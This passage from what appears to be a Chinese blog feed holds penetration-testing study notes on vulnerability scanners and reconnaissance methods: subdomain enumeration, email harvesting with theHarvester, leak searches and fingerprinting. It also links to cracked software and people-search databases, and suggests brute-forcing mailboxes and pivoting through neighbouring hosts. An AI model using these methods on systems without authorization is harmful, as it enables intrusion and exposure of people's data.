这个文件夹里</p></li><li><p>工具</p><p>物理地址查询：判断扫描的IP地址和你自己主机的关系</p><p>ARP query：扫描 Mac地址 和 IP地址</p><p>Whois：查询域名，在网站中用到</p><p>Trace roots：测试路由情况，most name 就是目标网站的IP（ping网站 就能得到）</p><p>Ping：和window自带的ping一样</p></li></ol>        <h2 id="1-6-AppScan">          <a href="#1-6-AppScan" class="heading-link"><i class="fas fa-link"></i></a>1.6. AppScan</h2>      <p><strong>功能介绍</strong></p><p>AppScan 是 web 应用程序渗透测试舞台上使用最广泛的工具之一，它是一个桌面应用程序，有助于专业安全人员进行 web 应用程序自动化脆弱性评估。</p><p>AppScan 其实是一个产品家族，包括众多的应用安全扫描产品，从开发阶段的源代码扫描的 AppScan source edition ，到针对 web 应用程序的快速扫描的 AppScan standard edition 以及进行安全管理和汇总整合的 AppScan enteprise edition 等，我们经常说的只是桌面的 AppScan ，即 AppScan standard edition ，其安装在 window 操作系统下，可以对网站等 web应用程序进行自动化的应用安全扫描和测试。</p><p>它需要 微软 C++ 2017 和 微软 .NET Framework4 4.7.2 Full 框架（所以就下载到虚拟机里，但是虚拟机 win 下下载时也没单独下载这个框架）</p><p>下载路径：<span class="exturl"><a class="exturl__link" href="https://www.52pojie.cn/thread-1189130-1-1.html">https://www.52pojie.cn/thread-1189130-1-1.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="1-6-1-实例">          <a href="#1-6-1-实例" class="heading-link"><i class="fas fa-link"></i></a>1.6.1.实例</h3>      <p>打开phpstudy，开启一台机器作为站点</p><p>文件-&gt;新建-&gt;常规模块（一般来说的）</p><ol><li><p>AppScan（自动或手动）(一般常选)</p><p>外部设备/客户机（AppScan作为记录代理）</p></li><li><p>从该url 启动扫描：扫哪个就填哪个站点</p></li><li><p>仅扫描此目录中或目录下的链接：就是选中的站点</p><p>将所有路径作为区分大小写来处理：这个包括第三方目录（该域名下的调用的第三方地址）</p></li><li><p>有点的站点可能需要账户密码才能扫描。</p></li><li><p>测试策略：</p><p>可以直接用默认的 Default（缺省值）</p></li><li><p>如何启动：</p><p>全面自动：一般选用这个就行了，立即扫描</p><p>稍后自动：就是先爬取网站，到达一定时间然后再扫描。</p></li><li><p>保存：</p><p>是：就会新建文件，扫描的会话就会保存在这个文件里</p></li><li><p>配置：</p><p>显示了以上的配置</p><p>可以单独点开查看，有的可以导入/导出</p></li><li><p>报告：</p><p>模板：有好几种，根据不同要求选择</p></li></ol><p><strong>注意：</strong></p><p>有的时候AppScan 扫描一个网站会导致这个网站崩溃（例如：银行，内容比较多，扫描的时间就比较久），或者扫描的过程中遇到错误，自动暂停了；这时我们就可以选择保存，这样我们就可以在下次扫描时接着上一次扫描的位置接着扫描。</p><p><strong>缺点：</strong></p><p>软件比较大，占内存。同时，它扫描速度也比较慢。它在国内的扫描力度不行，但是通用漏洞扫描比较强大。</p>        <h2 id="1-7-AWVS">          <a href="#1-7-AWVS" class="heading-link"><i class="fas fa-link"></i></a>1.7. AWVS</h2>      <p><strong>功能介绍</strong></p><p>AWVS 是一个自动化的 web应用程序测试工具，通过检查可利用的漏洞，黑客可以审核 web 应用程序的安全性。</p>        <h3 id="1-7-1-Dashboard-仪表板">          <a href="#1-7-1-Dashboard-仪表板" class="heading-link"><i class="fas fa-link"></i></a>1.7.1. Dashboard 仪表板</h3>      <p>显示扫描的运行以及爬取状态，显示漏洞个数和级别</p>        <h3 id="1-7-2-Targets-添加扫描目标">          <a href="#1-7-2-Targets-添加扫描目标" class="heading-link"><i class="fas fa-link"></i></a>1.7.2. Targets 添加扫描目标</h3>      <ol><li><p>General</p><p>Address：添加扫描IP</p><p>Description：设置扫描描述。</p><p>site login：登录扫描，有些时候扫描要登录。</p><p>use pre-recorrded login sequence：以保存的形式进行扫描，就是在登录的时候，把扫描的请求构成一个文件进行添加。</p><p>AcuSensor：就是在扫描前对目标网站判断是 php,aspx,jsp，用于减少误报，如果要用这个功能，就要在线下载这个文件（一般来说，也是很少用这个功能的）。</p></li><li><p>Crawl </p><p>User Agent：使用的头，可以用于伪造 Firefox，Chrome 等（访问的头）。</p><p>Exclude Path：排除扫描的路径。</p><p>Import Files：可以导入上一次没有扫完但是保存下来的文件进行接着扫描。</p></li><li><p>HTTP</p><p>HTTP Authentication：HTTP认证，就是有些网站得要登录，否则爬取不了登录后的页面信息。</p><p>Client Certificate：客户端证书，特殊的网站需要证书，导入进来就行了。</p><p>Proxy Server：HTTP代理功能。</p></li><li><p>Advanced：高级功能(一般不做）</p><p>Technologies：检测相应的 asp,php..</p></li><li><p>Scan Type：扫描类型</p><p>默认情况下是进行全方位扫描</p></li><li><p>Report：生成报告（各类模板，但是都是英文的）</p></li><li><p>Schedule：可以保持不变（instant），也可以自己修改，可以在特定时间段反复扫描</p></li></ol>        <h3 id="1-7-3-Settings">          <a href="#1-7-3-Settings" class="heading-link"><i class="fas fa-link"></i></a>1.7.3. Settings</h3>      <ol><li>Notification Settings：设置邮件发送告知工作人员扫描完成。</li></ol>        <h2 id="1-8-HP-WebInspect">          <a href="#1-8-HP-WebInspect" class="heading-link"><i class="fas fa-link"></i></a>1.8. HP WebInspect</h2>      <p>HP WebInspect 是一款文件大，系统资源占用更大的扫描软件，在安装后会开机自启很多功能繁琐的进程和服务，所以尽量将其安装在虚拟机中，操作系统在 win7以上，确保其支持 .Net Framework 4.5x 和 SQL Server 2012，开启前还需运行 services.msc 工具检查 SQL 和 WebInspect 系列服务是否正确启动，以防扫描时出现致命的错误中断，10.30版本可能需要 VPN。</p><p>优点：扫描 出来的报告是最全的。</p>        <h3 id="1-8-1-实例">          <a href="#1-8-1-实例" class="heading-link"><i class="fas fa-link"></i></a>1.8.1. 实例</h3>      <ol><li><p>文件 -&gt; 新建</p></li><li><p>Start URL：输入要扫描的网站</p></li><li><p>点击右面的 verify：显示网站（确保网站可以访问）</p></li><li><p>next button=&gt;：下一步（返回了 start url 的页面）</p></li><li><p>Scan Type：扫描类型（就用默认的 standard 就好了）</p></li><li><p>Scan Method：扫描模型（Crawl and Audit：爬行和审计 都有）</p></li><li><p>Policy：standard 就好了（里面还有单独的选项，如 SQL 之类的）</p></li><li><p>Gudie Scan 页面=&gt;：下一步</p></li><li><p>Use a login macro for this site：登录扫描</p><p>create：创建，跳转页面后是一个录制的过程（右边红⚪）</p><p>stop：停止录制</p><p>上面的 play 是模拟登录，看是否有问题</p></li><li><p>紧接着后面的 =&gt; 进行下一步</p></li><li><p>Profiler：运行策略，保持默认就好了，setting 也保持默认 ✔</p></li><li><p>Configure Detailed Options：里面的就是默认选项</p></li><li><p>Validate Settings and Start Scan 页面：上面 Save ，保持策略，下次扫描可以直接导入这个扫描策略。</p></li><li><p>Start Scan：开始扫描</p></li><li><p>Reports：报告输出</p><p>Generate report-&gt;next-&gt;</p></li></ol><p>特点：一边扫描，一边爬取，而AppScan 是先爬取后扫描</p>        <h2 id="1-9-Netspaker">          <a href="#1-9-Netspaker" class="heading-link"><i class="fas fa-link"></i></a>1.9. Netspaker</h2>      <p>效果比 AWVS 差很多。</p>        <h2 id="1-10-WVSS">          <a href="#1-10-WVSS" class="heading-link"><i class="fas fa-link"></i></a>1.10. WVSS</h2>      <p>绿盟的安全系统（要钱，没有破解版的）</p>        <h2 id="1-11-安恒明鉴">          <a href="#1-11-安恒明鉴" class="heading-link"><i class="fas fa-link"></i></a>1.11. 安恒明鉴</h2>      <p>安恒的漏洞弱口令扫描工具（要钱，没破解版的）</p>        <h2 id="1-12-Nessus">          <a href="#1-12-Nessus" class="heading-link"><i class="fas fa-link"></i></a>1.12. Nessus</h2>              <h3 id="1-12-1-功能">          <a href="#1-12-1-功能" class="heading-link"><i class="fas fa-link"></i></a>1.12.1.功能</h3>      <ol><li><p>Scan</p><p>Advanced Scan：高级扫描(默认)</p></li><li><p>Policies</p><p>Setting Type：根据自己情况</p><p>Port Scanning：端口设置扫描；设置端口扫描是十分重要的，直接关系扫描结果的准确性，如果是 default 的话就是默认的端口，如果输入 1-65535 就是1-65535 的所有端口，这样耗时很长，建议新手用 default。</p><p>Plugins：插件项目，选择合适的插件，搜索 denial ，列出所有拒绝服务检测的插件，点击“ENABLE”，禁止 Nessus 使用这些插件扫描，因为这些插件扫描可能造成目标系统宕机，应该排除掉。（默认是开启状态的，绿色的；禁止后是DISABLED红色的，意思是这个插件不再使用）</p></li><li><p>Schedule：可以设置扫描时间进行计划任务</p></li><li><p>右上角 点-&gt;sign out：设置完要退出</p></li><li><p>再次登录账户密码，新建扫扫描就会发现可以使用刚才设置的了</p></li><li><p>Upload Target：可以导入一个包含所有 IP 的 txt 文件</p></li><li><p>Lanch：点击，可以进行漏洞扫描</p></li></ol><p>点击 scan1 可以得到扫描结果。</p>        <h3 id="1-12-2-实例">          <a href="#1-12-2-实例" class="heading-link"><i class="fas fa-link"></i></a>1.12.2. 实例</h3>      <p>步骤：</p><ol><li><p>Policies页面</p><p>先 Advance Scan 新建一个策略模板</p><p>General：策略名称，描述</p><p>Permission：选择 can use</p><p>后面的默认好了</p><p>Plugins：右上角搜索 denial，把得出的 disable掉</p><p>save 保存模板，这样策略模板就新建成功了。</p></li><li><p>My Scan页面</p><p>New Scan：右上角，新建扫描</p><p>Advance scan：默认扫描策略</p><p>/user Defined选择自定义添加的扫描策略</p><p>输入任务名称，扫描IP地址，点击save即可看到新增的扫描任务</p><p>launch：启动扫描任务，可看到任务正在running</p></li></ol>        <h2 id="1-13-Nexpose">          <a href="#1-13-Nexpose" class="heading-link"><i class="fas fa-link"></i></a>1.13. Nexpose</h2>      <p>VM 虚拟机 ova 版本下载地址：<span class="exturl"><a class="exturl__link" href="http://download2.rapid7.com/download/NeXpose-v4/NexposeVA.ova">http://download2.rapid7.com/download/NeXpose-v4/NexposeVA.ova</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 或者 <span class="exturl"><a class="exturl__link" href="http://www.rapid7.com/products/nexpose/download.jsp">http://www.rapid7.com/products/nexpose/download.jsp</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>ova 版本的账户密码：nexpose</p><p>最大的优点：这个软件和 MSF 一起使用（它们是同一个公司出的）</p>        <h2 id="1-14-启明天镜（BS-版）">          <a href="#1-14-启明天镜（BS-版）" class="heading-link"><i class="fas fa-link"></i></a>1.14. 启明天镜（BS 版）</h2>      <p>天镜脆弱性扫描与管理系统</p><p>免费 3 个月的使用，还原虚拟机（或者修改日期）又可以免费使用。（但是没有找到资源）</p>        <h2 id="1-15-RSAS（绿盟）">          <a href="#1-15-RSAS（绿盟）" class="heading-link"><i class="fas fa-link"></i></a>1.15. RSAS（绿盟）</h2>      <p>系统和 Web 可以同时扫描。</p>        <h1 id="二，漏洞扫描评估方案讲解">          <a href="#二，漏洞扫描评估方案讲解" class="heading-link"><i class="fas fa-link"></i></a>二，漏洞扫描评估方案讲解</h1>              <h2 id="2-1-测试目的">          <a href="#2-1-测试目的" class="heading-link"><i class="fas fa-link"></i></a>2.1. 测试目的</h2>              <h3 id="2-1-1-测试目的">          <a href="#2-1-1-测试目的" class="heading-link"><i class="fas fa-link"></i></a>2.1.1. 测试目的</h3>      <p>通过了解各家厂商的设备性能和功能是否能够满足当前业务需要。</p>        <h3 id="2-1-2-测试对象">          <a href="#2-1-2-测试对象" class="heading-link"><i class="fas fa-link"></i></a>2.1.2. 测试对象</h3>      <ol><li>绿盟科技 Web 应用漏洞扫描系统</li><li>杭州安恒网站安全监测平台</li><li>知道创宇 WEBSOC 网站立体监控系统</li><li>启明星辰</li></ol>        <h3 id="2-1-3-测试内容">          <a href="#2-1-3-测试内容" class="heading-link"><i class="fas fa-link"></i></a>2.1.3. 测试内容</h3>      <ol><li>功能测试：包括扫描漏报测试，漏洞误报测试，页面发现测试，管理功能测试。</li><li>性能测试：包括扫描速度测试，平均速率测试，最大速率测试。</li><li>可靠性测试：包括断电恢复测试，断点续扫测试。</li></ol>        <h3 id="2-1-4-测试环境">          <a href="#2-1-4-测试环境" class="heading-link"><i class="fas fa-link"></i></a>2.1.4. 测试环境</h3>      <ol><li><p>网络拓扑</p></li><li><p>测试目标机构</p></li></ol>        <h2 id="2-2-测试案例">          <a href="#2-2-测试案例" class="heading-link"><i class="fas fa-link"></i></a>2.2. 测试案例</h2>      <p>首先要找那种漏洞多的网站进行测试</p>        <h3 id="2-2-1-扫描功能和相关性能测试">          <a href="#2-2-1-扫描功能和相关性能测试" class="heading-link"><i class="fas fa-link"></i></a>2.2.1. 扫描功能和相关性能测试</h3>      <ol><li>漏报数</li><li>误报数</li><li>页面发现数</li><li>扫描速率</li><li>平均速率</li><li>最大速率</li><li>…</li></ol>        <h3 id="2-2-2-管理功能测试">          <a href="#2-2-2-管理功能测试" class="heading-link"><i class="fas fa-link"></i></a>2.2.2. 管理功能测试</h3>      <p>按照工作流分别对任务管理，报表管理，分布式管理功能按照测试表逐项测试。</p>        <h3 id="2-2-3-可靠性测试">          <a href="#2-2-3-可靠性测试" class="heading-link"><i class="fas fa-link"></i></a>2.2.3. 可靠性测试</h3>      <ol><li>断电恢复测试：扫描过程突然断电，查看扫描引擎是否能够对任务信息，扫描过程信息，关键配置信息，模板信息等进行备份或保存。</li><li>断点续扫测试：扫描任务暂停或意外中断后再恢复，查看任务是否正常。</li></ol>        <h2 id="2-3-测试结果">          <a href="#2-3-测试结果" class="heading-link"><i class="fas fa-link"></i></a>2.3. 测试结果</h2>              <h3 id="2-3-1-扫描功能和相关测试性能">          <a href="#2-3-1-扫描功能和相关测试性能" class="heading-link"><i class="fas fa-link"></i></a>2.3.1. 扫描功能和相关测试性能</h3>              <h3 id="2-3-2-管理功能测试">          <a href="#2-3-2-管理功能测试" class="heading-link"><i class="fas fa-link"></i></a>2.3.2. 管理功能测试</h3>              <h3 id="2-3-3-可靠性测试">          <a href="#2-3-3-可靠性测试" class="heading-link"><i class="fas fa-link"></i></a>2.3.3. 可靠性测试</h3>              <h2 id="2-4-相关扫描软件测试评估">          <a href="#2-4-相关扫描软件测试评估" class="heading-link"><i class="fas fa-link"></i></a>2.4. 相关扫描软件测试评估</h2>      <p>国外软件：<span class="exturl"><a class="exturl__link" href="http://sectoolmarket.com/wivet-score-unified-list.html%EF%BC%88%E4%B8%8D%E4%B8%80%E5%AE%9A%E5%BE%88%E5%87%86%E7%A1%AE%EF%BC%89">http://sectoolmarket.com/wivet-score-unified-list.html（不一定很准确）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="2020/07/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2020/07/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="一-信息收集">          <a href="#一-信息收集" class="heading-link"><i class="fas fa-link"></i></a>一. 信息收集</h1>              <h2 id="1-1-第一步：域名探测">          <a href="#1-1-第一步：域名探测" class="heading-link"><i class="fas fa-link"></i></a>1.1. 第一步：域名探测</h2>      <p>当我们对一个站点进行渗透探测之前，一般渗透测试人员直接通过漏洞扫描器对指定目标站点进行渗透，当指定目标站点无漏洞时，渗透测试人员就需要进行信息收集工作来完成后期的渗透。</p><p>目前一般域名漏洞扫描工具  ：AWVS，APPSCAN，Netspark，Webinspect，Nmap，Nessus，天镜，明鉴，WVSS，RSAS，等。</p><a id="more"></a>        <h2 id="1-2-第二步：子域名探测">          <a href="#1-2-第二步：子域名探测" class="heading-link"><i class="fas fa-link"></i></a>1.2. 第二步：子域名探测</h2>      <p>根据主域名，可以获得二级域名，三级域名，。。。主要姿势可以有：</p>        <h3 id="1-2-1-DNS域-传送漏洞">          <a href="#1-2-1-DNS域-传送漏洞" class="heading-link"><i class="fas fa-link"></i></a>1.2.1. DNS域 传送漏洞</h3>      <p>如果存在，不仅能搜索到子域名，还能轻松找到一个枚举，这样的好事百试不厌；如果 SRC 一级域名不多，直接在 kali 下 dnsenum + 域名（比如说：dnsenum oldboy.com -f /dns.txt –dnsserver 114.114.114.114 )</p><p><strong>工具说明及用法可参考如下:</strong></p><p>dnsenum的目的是尽可能收集一个域的信息，它能够通过谷歌或者字典文件猜测可能存在的域名，以及对一个网段进行反向查询。它可以查询网站的主机地址信息。域名服务器、mxrecord (函件交换记录)，在域名服务器上执行axfr请求，通过谷歌脚本得到扩展城名信息google hacking),提取自域名并查询，计算C类地址并执行whois查询，执行反向查询，把地址段写入文件。</p><p><strong>参数说明:</strong></p><ol><li>-h：查看工具使用帮助</li><li>–dnsserver <server> ：指定域名服务器</server></li><li>–enum ：快捷选项，相当于”-threads -s 15 -w”</li><li>–noreverse ：跳过反向查询操作</li><li>–nocolor ：无彩色输出</li><li>–private ：显示并在”domain_ips.txt”文件结尾保存私有的ips</li><li>–subfile <file> ：写入所有有效的子域名到指定文件</file></li><li>–t，–timeout <value> ：tcp或者udp的连接超时时间。默认为10s (时间单位:秒)。</value></li><li>–threads <vaue> ：查询线程数</vaue></li><li>-v，–verbose ：显示所有的进度和错误消息</li><li>-o，–output <file> ：输出选项，将输出信息保存到指定文件。</file></li><li>-e，–exclude <regexp> ：反向查询选项，从反向查询结果中排除与正则表达式相符的PTR 记录，在排查无效主机上非常有用。</regexp></li><li>-w，–whois ：在一个C段网络地址范围提供whois查询</li><li>-f dns.txt ：指定字典文件，可以换成dns-big.txt也可以自定义字典</li></ol><p>相关解析记录说明可参考：<span class="exturl"><a class="exturl__link" href="https://wenku.baidu.com/view/d2d597b669dc5022aaea0030.html">https://wenku.baidu.com/view/d2d597b669dc5022aaea0030.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="1-2-2-备案号查询">          <a href="#1-2-2-备案号查询" class="heading-link"><i class="fas fa-link"></i></a>1.2.2.备案号查询</h3>      <p>这算是奇招吧，通过查询系统域名备案号，再反查备案号相关的域名，收获颇丰。</p><p>网站备案查询地址：<span class="exturl"><a class="exturl__link" href="http://www.beianbeian.com/">http://www.beianbeian.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="1-2-3-SSL-证书">          <a href="#1-2-3-SSL-证书" class="heading-link"><i class="fas fa-link"></i></a>1.2.3. SSL 证书</h3>      <p>通过查询 SSL 证书（现在很多网站都是 https），获取的域名存活率很高，这应该也是不错的思路。</p><p>查询网址：<span class="exturl"><a class="exturl__link" href="https://myssl.com/ssl.html">https://myssl.com/ssl.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 或者 <span class="exturl"><a class="exturl__link" href="https://www.chinassl.net/ssltools/ssl-checker.html">https://www.chinassl.net/ssltools/ssl-checker.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="1-2-4-Google-搜索-C-段">          <a href="#1-2-4-Google-搜索-C-段" class="heading-link"><i class="fas fa-link"></i></a>1.2.4. Google 搜索 C 段</h3>      <p>这招比较少，国内 Google 没法用，国内的用 bin 或者 百度 都可以，在没有什么进展的情况下或许会有惊喜。（比如说，网站被挂码了）</p><p>方法一：参照 Google hacking 的方法</p><p>方法二：用 k8 工具，前提条件是要注册 bing（必应） 接口。（k8_C段旁注工具）</p><p>什么是C段:比如在：127.127.127.4这个IP上面有一个网站127.4 这个服务器上面有网站，我们可以想想，他是一个非常大的站几乎没什么漏洞，但是在他同C段 127.127.127.1<del>127.127.127.255这1</del>255上面也有服务器而且也有网站并且存在漏洞,那么我们就可以来渗透1~255 任何一个站之后提权来嗅探得到127.4这台服务器的密码甚至3389连接的密码后台登录的密码如果运气好会得到很多的密码。</p>        <h3 id="1-2-5-APP-提取">          <a href="#1-2-5-APP-提取" class="heading-link"><i class="fas fa-link"></i></a>1.2.5. APP 提取</h3>      <p>反编译APP进行提取相关IP地址，此外在APP上挖洞的时候，可以发现前面招式找不到的域名，在APP里面有大量的接口IP和内网IP, 同时可获取不少安全漏洞。（其实 app 的漏洞比 web 多一些）</p><p>Andriod Killer，当网站有app，然后把app下载下来，进行反编译分析，就会有一系列IP</p>        <h3 id="1-2-6-微信公众号">          <a href="#1-2-6-微信公众号" class="heading-link"><i class="fas fa-link"></i></a>1.2.6. 微信公众号</h3>      <p>企业的另一通道，渗透相关公众号，绝对会有意外收获，：不少漏洞+域名，有关 Burp 抓取 app</p>        <h3 id="1-2-7-字典枚举法">          <a href="#1-2-7-字典枚举法" class="heading-link"><i class="fas fa-link"></i></a>1.2.7. 字典枚举法</h3>      <p>字典枚举法是一种传统的查找子域名的技术，这类技术涉及的工具有：DNSReconcile，Layer 子域名挖掘机，DirBuster，Demon二级域名爆破</p>        <h3 id="1-2-8-公开-DNS-源">          <a href="#1-2-8-公开-DNS-源" class="heading-link"><i class="fas fa-link"></i></a>1.2.8. 公开 DNS 源</h3>      <p>Rapid 7 下 Sonor 项目发布的：<span class="exturl"><a class="exturl__link" href="https://scans.io/study/sonar.fdns_v2">https://scans.io/study/sonar.fdns_v2</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>DNS 历史解析： <span class="exturl"><a class="exturl__link" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="1-2-9-威胁情报查询">          <a href="#1-2-9-威胁情报查询" class="heading-link"><i class="fas fa-link"></i></a>1.2.9. 威胁情报查询</h3>      <p>华为安全情报：<span class="exturl"><a class="exturl__link" href="https://isecurity.huawei.com/">https://isecurity.huawei.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h2 id="1-3-敏感信息收集">          <a href="#1-3-敏感信息收集" class="heading-link"><i class="fas fa-link"></i></a>1.3. 敏感信息收集</h2>              <h3 id="1-3-1-web源代码泄露">          <a href="#1-3-1-web源代码泄露" class="heading-link"><i class="fas fa-link"></i></a>1.3.1. web源代码泄露</h3>      <p>通过相关工具暴力破解相关 Web 源码。</p><p>最强调的是 GitHub 信息泄露了，直接取GitHub 上搜索，可能有人不自信认为自己没有能力去 SRC 挖洞。</p><p>信息泄露收集可能会用到以下地址：</p><ol><li>网盘搜索：<span class="exturl"><a class="exturl__link" href="http://www.pansou.com/">http://www.pansou.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>网盘密码破解可参考：<span class="exturl"><a class="exturl__link" href="https://www.52pojie.cn/thread-763130-1-1.html">https://www.52pojie.cn/thread-763130-1-1.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>社工信息泄露：<span class="exturl"><a class="exturl__link" href="https://www.instantcheckmate.com/">https://www.instantcheckmate.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>源码搜索：<span class="exturl"><a class="exturl__link" href="https://searchcode.com,https//gitee.com%EF%BC%8Chttps://gitcafe.com%EF%BC%8Chttps://code.csdn.net">https://searchcode.com，https://gitee.com，https://gitcafe.com，https://code.csdn.net</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>钟馗之眼：<span class="exturl"><a class="exturl__link" href="https://www/zoomeye.org">https://www/zoomeye.org</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>天眼查：<span class="exturl"><a class="exturl__link" href="https://www.tianyancha.com/">https://www.tianyancha.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>其他：威胁情报，微步在线，ti.360.cn，Virustotal</li></ol>        <h3 id="1-3-2-邮箱信息收集">          <a href="#1-3-2-邮箱信息收集" class="heading-link"><i class="fas fa-link"></i></a>1.3.2. 邮箱信息收集</h3>      <p>收集邮箱信息主要有两个作用: </p><ol><li>通过发现目标系统账号的命名规律，可以用来后期登入其他子系统。</li><li>爆破登入邮箱用。</li></ol><p>通常，邮箱的账号有如下几种生成规律:比如某公司有员工名叫做“张小三”，它的邮箱可能如下:<br><span class="exturl"><a class="exturl__link" href="mailto:&#x7a;&#104;&#97;&#x6e;&#103;&#120;&#105;&#x61;&#x6f;&#x73;&#x61;&#110;&#x40;&#120;&#111;&#x78;&#x2e;&#x63;&#111;&#109;">&#x7a;&#104;&#97;&#x6e;&#103;&#120;&#105;&#x61;&#x6f;&#x73;&#x61;&#110;&#x40;&#120;&#111;&#x78;&#x2e;&#x63;&#111;&#109;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>     <span class="exturl"><a class="exturl__link" href="mailto:&#120;&#105;&#x61;&#111;&#x73;&#x61;&#x6e;&#x2e;&#122;&#x68;&#x61;&#110;&#103;&#x40;&#x6f;&#120;&#x2e;&#x63;&#111;&#x6d;">&#120;&#105;&#x61;&#111;&#x73;&#x61;&#x6e;&#x2e;&#122;&#x68;&#x61;&#110;&#103;&#x40;&#x6f;&#120;&#x2e;&#x63;&#111;&#x6d;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>    <span class="exturl"><a class="exturl__link" href="mailto:&#122;&#x78;&#105;&#x61;&#x6f;&#115;&#x61;&#110;&#x40;&#120;&#120;&#46;&#x63;&#111;&#x6d;">&#122;&#x78;&#105;&#x61;&#x6f;&#115;&#x61;&#110;&#x40;&#120;&#120;&#46;&#x63;&#111;&#x6d;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>当我们收集几个邮箱之后，便会大致猜出对方邮箱的命名规律。除了员工的邮箱之外，通过公司会有一些共有的邮箱，比如人力的邮箱、客服的邮箱，<span class="exturl"><a class="exturl__link" href="mailto:&#104;&#114;&#x40;&#120;&#x78;&#46;&#99;&#111;&#x6d;">&#104;&#114;&#x40;&#120;&#x78;&#46;&#99;&#111;&#x6d;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>/kefu@xx.com 这种邮箱有时会存在弱口令，在渗透时可额外留意下， 我们可以通过手工或者工具的方式来确定搜索邮箱。</p><p><strong>手工方式：</strong></p><ol><li>可以到百度等搜索引擎上搜索邮箱信息</li><li>GitHub 等第三方托管平台</li><li>社工库</li></ol><p><strong>工具方式：</strong></p><p>在邮箱收集领域不得不提一个工具：The Harvester，The Harvester 可用于搜索Google，Bing 和 PGP 服务器的电子邮件. 主机 . 子域名，因此需要翻墙运用此工具。工具下载地址：<span class="exturl"><a class="exturl__link" href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><strong>注：</strong></p><p>python -m pip install -r requirements.txt  导入相关配置，python3.7版本（其他的可能不行）</p><p>使用方法很简单：./theHarvester.py -d 域名 -l 1000 -b all（-l 是搜索页数，-b 是指把所有搜索引擎都使用一遍，看哪个可以）</p>        <h3 id="1-3-3-历史漏洞收集">          <a href="#1-3-3-历史漏洞收集" class="heading-link"><i class="fas fa-link"></i></a>1.3.3. 历史漏洞收集</h3>      <p>仔细分析，大胆验证，发散思维，对企业的运维，开发习惯了解绝对是有很大帮助的。可以把漏洞保存下来进行统计。这些漏洞，企业可能没有修复，或者没有修复完整。</p><ol><li>wooyun 历史漏洞库：<span class="exturl"><a class="exturl__link" href="https://www.anquan.us/%EF%BC%88%E7%8E%B0%E5%9C%A8%E6%89%93%E4%B8%8D%E5%BC%80%E4%BA%86%EF%BC%89">https://www.anquan.us/（现在打不开了）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>漏洞银行：<span class="exturl"><a class="exturl__link" href="https://www.bugbank.cn/">https://www.bugbank.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>360补天：<span class="exturl"><a class="exturl__link" href="https://www.butian.net/">https://www.butian.net/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>教育行业漏洞报告平台(Beta)：<span class="exturl"><a class="exturl__link" href="https://src.edu-info.edu.cn/login/">https://src.edu-info.edu.cn/login/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li></ol>        <h2 id="1-4-指纹识别">          <a href="#1-4-指纹识别" class="heading-link"><i class="fas fa-link"></i></a>1.4. 指纹识别</h2>      <p>在这个过程可以加入端口扫描，敏感文件扫描之类的操作，用到的工具，如：御剑，whatweb，Wapplyzer等工具。</p><p>推荐一篇文章：<span class="exturl"><a class="exturl__link" href="https://anquanke.com/post/id/178230/">https://anquanke.com/post/id/178230/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h2 id="1-5-资产梳理">          <a href="#1-5-资产梳理" class="heading-link"><i class="fas fa-link"></i></a>1.5. 资产梳理</h2>      <p>有了庞大的域名，接下来就是帮助SRC梳理资产了。城名可以先判断存活，活着的维续进行确定IP环节。根据IP的分布，确定企业的公网网段。这其实是一项不小的工程， 精准度比较难以拿捏。不过通过不断实战，肯定可以琢磨出一些东西，所以有人称白帽子可能会比企业的运维更了解资产信息。资产梳理过程中可能需要对相关资产漏洞进行查询、利用、发布等，可能会用到已下相关链接地址:</p>        <h3 id="1-5-1-SRC众测平台">          <a href="#1-5-1-SRC众测平台" class="heading-link"><i class="fas fa-link"></i></a>1.5.1.SRC众测平台</h3>      <ol><li>国际漏洞提交平台：<span class="exturl"><a class="exturl__link" href="https://www/hackerone.com/">https://www/hackerone.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li><li>BugX 区块链漏洞平台：<span class="exturl"><a class="exturl__link" 